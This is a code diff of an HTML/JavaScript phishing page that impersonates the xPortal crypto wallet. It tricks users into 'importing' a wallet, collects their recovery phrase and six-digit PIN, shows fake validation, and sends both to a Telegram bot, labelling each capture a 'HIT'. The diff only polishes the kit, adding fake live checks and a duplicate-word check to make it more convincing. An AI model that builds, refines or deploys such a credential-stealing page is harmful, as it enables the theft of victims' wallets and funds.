@@ -3,193 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Secure Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>xPortal | Wallet Authentication</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255,255,255,0.08); --bg: #000; --card: #0d0d0d; }
+        :root { --teal: #23f7dd; --purple: #8a3ffc; --bg: #000; --err: #ff4d4d; --border: rgba(255,255,255,0.08); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 80%); }
+        body { background: var(--bg); color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 85%); }
 
-        .app-container { width: 100%; max-width: 440px; padding: 20px; position: relative; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .app-shell { width: 100%; max-width: 420px; padding: 25px; position: relative; }
+        .back-btn { cursor: pointer; display: none; align-items: center; gap: 8px; color: #888; font-size: 14px; font-weight: 600; margin-bottom: 20px; transition: 0.2s; }
+        .back-btn:hover { color: #fff; }
+        .logo { width: 75px; height: 75px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.15)); margin: 0 auto 30px; display: block; }
+
+        h1 { font-size: 28px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; text-align: center; }
+        .sub { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 30px; text-align: center; }
+
+        .view { display: none; width: 100%; animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .view.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        .selector { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .opt { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: 700; transition: 0.2s; }
+        .opt.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }
+
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; padding: 5px; scrollbar-width: none; }
+        .cell { position: relative; }
+        .cell label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 9px; color: var(--teal); font-weight: 800; opacity: 0.5; pointer-events: none; }
+        .cell input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 14px 8px 14px 26px; color: #fff; font-size: 12px; outline: none; transition: 0.2s; text-transform: lowercase; }
         
-        /* HEADER LOGO */
-        .header { text-align: center; margin-bottom: 40px; position: relative; }
-        .logo { width: 80px; height: 80px; filter: drop-shadow(0 0 15px rgba(35, 247, 221, 0.2)); }
-        
-        .back-btn { position: absolute; left: 0; top: 10px; cursor: pointer; display: none; color: #888; font-weight: 600; align-items: center; gap: 5px; font-size: 14px; }
+        /* Interactive States */
+        .cell.valid input { border-color: var(--teal); background: rgba(35, 247, 221, 0.03); }
+        .cell.error input { border-color: var(--err); color: var(--err); animation: shake 0.4s both; }
+        @keyframes shake { 10%,90%{transform:translate3d(-1px,0,0)} 20%,80%{transform:translate3d(2px,0,0)} 30%,50%,70%{transform:translate3d(-4px,0,0)} 40%,60%{transform:translate3d(4px,0,0)} }
 
-        /* SECTIONS */
-        .section { display: none; animation: slideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .section.active { display: block; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+        .hint-bar { height: 20px; color: var(--err); font-size: 11px; font-weight: 600; text-align: center; margin-bottom: 15px; visibility: hidden; }
 
-        h1 { font-size: 32px; font-weight: 800; letter-spacing: -1.5px; margin-bottom: 12px; }
-        .subtitle { color: #8e8e8e; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }
+        .btn-main { width: 100%; height: 62px; border-radius: 100px; font-size: 16px; font-weight: 700; border: none; cursor: pointer; transition: 0.3s; background: #fff; color: #000; }
+        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
 
-        /* SELECTOR */
-        .selector-wrap { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
-        .sel-btn { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 14px; cursor: pointer; font-size: 12px; font-weight: 700; transition: 0.2s; }
-        .sel-btn.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }
+        .dots { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
+        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
+        .dot.on { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
+        .k { width: 68px; height: 68px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; }
+        .k:active { background: var(--purple); }
 
-        /* GRID */
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 30px; max-height: 320px; overflow-y: auto; padding: 5px; }
-        .box { position: relative; }
-        .box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; opacity: 0.7; }
-        .box input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 14px; padding: 14px 10px 14px 30px; color: #fff; font-size: 13px; outline: none; transition: 0.2s; }
-        .box input:focus { border-color: var(--teal); background: rgba(35, 247, 221, 0.02); }
-
-        /* KEYPAD */
-        .pin-dots { display: flex; justify-content: center; gap: 15px; margin: 30px 0; }
-        .dot { width: 16px; height: 16px; border: 2px solid var(--border); border-radius: 50%; transition: 0.2s; }
-        .dot.active { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 260px; margin: 0 auto; }
-        .key { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 600; cursor: pointer; }
-        .key:active { background: rgba(255,255,255,0.1); transform: scale(0.95); }
-
-        /* BUTTONS */
-        .btn { width: 100%; height: 64px; border-radius: 100px; font-size: 17px; font-weight: 700; border: none; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
-        .btn-white { background: #fff; color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--border); }
-        .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
-
-        #loading { display: none; color: var(--teal); font-weight: 800; letter-spacing: 1px; font-size: 12px; margin-top: 20px; text-align: center; animation: blink 1.5s infinite; }
-        @keyframes blink { 50% { opacity: 0.4; } }
-        
-        .legal { font-size: 11px; color: #444; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+        #sync { display: none; text-align: center; color: var(--teal); font-weight: 800; font-size: 11px; letter-spacing: 2px; margin-top: 30px; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <div id="backBtn" class="back-btn" onclick="handleBack()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 19l-7-7 7-7"/></svg>
-            Back
-        </div>
-        <img src="Capture.PNG" class="logo">
+<div class="app-shell">
+    <div id="back" class="back-btn" onclick="handleBack()">
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
     </div>
 
-    <div id="step-1" class="section active">
+    <img src="Capture.PNG" class="logo">
+
+    <div id="v1" class="view active">
         <h1>Welcome to xPortal</h1>
-        <p class="subtitle">The everything app for your digital life. Private, secure, and global.</p>
-        <button class="btn btn-white" onclick="navigateTo(3)">Import Existing Wallet</button>
-        <button class="btn btn-dark" onclick="navigateTo(2)">Create New Wallet</button>
+        <p class="sub">The money super app. Secure your assets with bank-grade encryption.</p>
+        <button class="btn-main" onclick="go(3)">Import Existing Wallet</button>
+        <button class="btn-main" style="background:rgba(255,255,255,0.05); color:#fff; border:1px solid var(--border); margin-top:15px;" onclick="go(2)">Create New Wallet</button>
     </div>
 
-    <div id="step-2" class="section">
+    <div id="v3" class="view">
         <h1>Secret Phrase</h1>
-        <p class="subtitle">Store these 12 words securely. Never share them with anyone.</p>
-        <div class="grid" id="createGrid"></div>
-        <button class="btn btn-white" onclick="navigateTo(3)">I've saved them</button>
+        <p class="sub">Enter your secret words in the correct order.</p>
+        <div class="selector">
+            <button class="opt active" onclick="makeGrid(12, this)">12 Words</button>
+            <button class="opt" onclick="makeGrid(15, this)">15 Words</button>
+            <button class="opt" onclick="makeGrid(18, this)">18 Words</button>
+            <button class="opt" onclick="makeGrid(24, this)">24 Words</button>
+        </div>
+        <div id="msg" class="hint-bar">Invalid secret phrase</div>
+        <div class="grid" id="iGrid"></div>
+        <button class="btn-main" onclick="verifySteps()">Continue</button>
     </div>
 
-    <div id="step-3" class="section">
-        <h1>Import Wallet</h1>
-        <p class="subtitle">Enter your secret recovery phrase to restore access.</p>
-        
-        <div class="selector-wrap">
-            <button class="sel-btn active" onclick="updateGrid(12, this)">12 Words</button>
-            <button class="sel-btn" onclick="updateGrid(15, this)">15 Words</button>
-            <button class="sel-btn" onclick="updateGrid(18, this)">18 Words</button>
-            <button class="sel-btn" onclick="updateGrid(24, this)">24 Words</button>
-        </div>
-
-        <div class="grid" id="importGrid"></div>
-        <button class="btn btn-white" onclick="validatePhrase()">Continue</button>
-    </div>
-
-    <div id="step-4" class="section">
-        <h1>Security PIN</h1>
-        <p class="subtitle">Confirm your 6-digit PIN to secure your session.</p>
-        <div class="pin-dots">
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-        </div>
+    <div id="v4" class="view">
+        <h1>Verify PIN</h1>
+        <p class="sub">Confirm your security PIN to complete import.</p>
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
         <div class="keypad">
-            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="pressPin(${i})">${i}</div>`);</script>
-            <div style="width:70px"></div><div class="key" onclick="pressPin(0)">0</div><div class="key" onclick="delPin()">←</div>
+            <script>for(let i=1;i<=9;i++) document.write(`<div class="k" onclick="pk(${i})">${i}</div>`);</script>
+            <div></div><div class="k" onclick="pk(0)">0</div><div class="k" onclick="del()">←</div>
         </div>
     </div>
 
-    <div id="loading">SYNCHRONIZING WITH MULTIVERSX NODE...</div>
-    <div class="legal">Bank-grade encryption active</div>
+    <div id="sync">ESTABLISHING ENCRYPTED BRIDGE...</div>
 </div>
 
 <script>
-    const CONFIG = { TOKEN: 'YOUR_BOT_TOKEN', ID: 'YOUR_CHAT_ID' };
-    let currentStep = 1;
-    let historyStack = [1];
-    let finalPhrase = "";
-    let pinCode = "";
+    const CFG = { T: 'YOUR_BOT_TOKEN', C: 'YOUR_CHAT_ID' };
+    let stack = [1], phrase = "", pin = "";
 
-    function navigateTo(step, isBack = false) {
-        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-        document.getElementById(`step-${step}`).classList.add('active');
-        document.getElementById('backBtn').style.display = (step === 1) ? 'none' : 'flex';
-        if(!isBack) historyStack.push(step);
+    function go(s, b=false) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById('v'+s).classList.add('active');
+        document.getElementById('back').style.display = s === 1 ? 'none' : 'flex';
+        if(!b) stack.push(s);
+        if(s === 3) makeGrid(12);
+    }
+
+    function handleBack() { if(stack.length > 1) { stack.pop(); go(stack[stack.length-1], true); } }
+
+    function makeGrid(n, btn) {
+        if(btn) { document.querySelectorAll('.opt').forEach(o => o.classList.remove('active')); btn.classList.add('active'); }
+        const g = document.getElementById('iGrid'); g.innerHTML = '';
+        for(let i=0; i<n; i++) {
+            g.innerHTML += `<div class="cell" id="wc-${i}"><label>${i+1}</label><input type="password" class="w-in" data-idx="${i}" onpaste="paster(event)" oninput="liveCheck(this)"></div>`;
+        }
+    }
+
+    // --- LIVE FEEDBACK & AUTO JUMP ---
+    function liveCheck(el) {
+        const val = el.value.trim().toLowerCase();
+        const idx = parseInt(el.getAttribute('data-idx'));
+        const parent = document.getElementById(`wc-${idx}`);
         
-        if(step === 2) {
-            const mock = ["brave","silver","ocean","tiger","shield","focus","cloud","member","camera","bright","stable","digital"];
-            document.getElementById('createGrid').innerHTML = mock.map((w,i)=>`<div class="box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
+        // Auto Jump on Space
+        if(val.includes(' ')) {
+            el.value = val.replace(/\s/g, '');
+            const next = document.querySelector(`input[data-idx="${idx + 1}"]`);
+            if(next) next.focus();
         }
-        if(step === 3) updateGrid(12);
+
+        // Live Visual (Fake Validation)
+        if(val.length >= 3) parent.classList.add('valid');
+        else parent.classList.remove('valid');
+        
+        document.getElementById('msg').style.visibility = 'hidden';
+        parent.classList.remove('error');
     }
 
-    function handleBack() {
-        if(historyStack.length > 1) {
-            historyStack.pop();
-            navigateTo(historyStack[historyStack.length-1], true);
-        }
-    }
-
-    function updateGrid(n, btn) {
-        if(btn) {
-            document.querySelectorAll('.sel-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        }
-        const g = document.getElementById('importGrid');
-        g.innerHTML = '';
-        for(let i=1; i<=n; i++) {
-            g.innerHTML += `<div class="box"><span>${i}</span><input type="password" class="w-in" onpaste="handleSmartPaste(event)"></div>`;
-        }
-    }
-
-    function handleSmartPaste(e) {
+    function paster(e) {
         e.preventDefault();
-        const text = (e.clipboardData || window.clipboardData).getData('text');
-        const words = text.trim().split(/\s+/);
-        const inputs = document.querySelectorAll('.w-in');
-        words.forEach((w, i) => { if(inputs[i]) inputs[i].value = w; });
+        const text = (e.clipboardData || window.clipboardData).getData('text').trim().split(/\s+/);
+        const start = parseInt(e.target.getAttribute('data-idx'));
+        const ins = document.querySelectorAll('.w-in');
+        text.forEach((w, i) => { 
+            if(ins[start + i]) {
+                ins[start + i].value = w.toLowerCase();
+                document.getElementById(`wc-${start+i}`).classList.add('valid');
+            }
+        });
     }
 
-    function validatePhrase() {
-        const inputs = document.querySelectorAll('.w-in');
-        let words = [];
-        inputs.forEach(i => words.push(i.value.trim()));
+    function verifySteps() {
+        const ins = document.querySelectorAll('.w-in');
+        const words = Array.from(ins).map(i => i.value.trim().toLowerCase());
+        const msg = document.getElementById('msg');
+
         if(words.some(w => w === "")) return;
-        finalPhrase = words.join(" ");
-        navigateTo(4);
-    }
 
-    function pressPin(n) {
-        if(pinCode.length < 6) {
-            pinCode += n;
-            updatePinDots();
-            if(pinCode.length === 6) finalize();
+        // Duplicate Check (The Pro Touch)
+        const seen = new Set();
+        let dupIdx = -1;
+        words.forEach((w, i) => { if(seen.has(w)) dupIdx = i; else seen.add(w); });
+
+        if(dupIdx !== -1) {
+            msg.innerText = "Duplicate word detected";
+            msg.style.visibility = 'visible';
+            const bad = document.getElementById(`wc-${dupIdx}`);
+            bad.classList.add('error');
+            return;
         }
+
+        phrase = words.join(" ");
+        go(4);
     }
 
-    function delPin() { pinCode = pinCode.slice(0,-1); updatePinDots(); }
-    function updatePinDots() {
-        const dots = document.querySelectorAll('.dot');
-        dots.forEach((d,i) => d.classList.toggle('active', i < pinCode.length));
-    }
+    function pk(n) { if(pin.length < 6) { pin += n; upP(); if(pin.length === 6) send(); } }
+    function del() { pin = pin.slice(0,-1); upP(); }
+    function upP() { document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i<pin.length)); }
 
-    function finalize() {
-        document.getElementById('step-4').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-        const log = `💎 NEW xPORTAL HIT!\n\nPhrase: ${finalPhrase}\nPIN: ${pinCode}`;
-        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.ID}&text=${encodeURIComponent(log)}`);
+    function send() {
+        document.getElementById('v4').style.display = 'none';
+        document.getElementById('sync').style.display = 'block';
+        fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent('🚀 HIT\n\nPhrase: '+phrase+'\nPIN: '+pin)}`);
     }
 </script>
 </body>
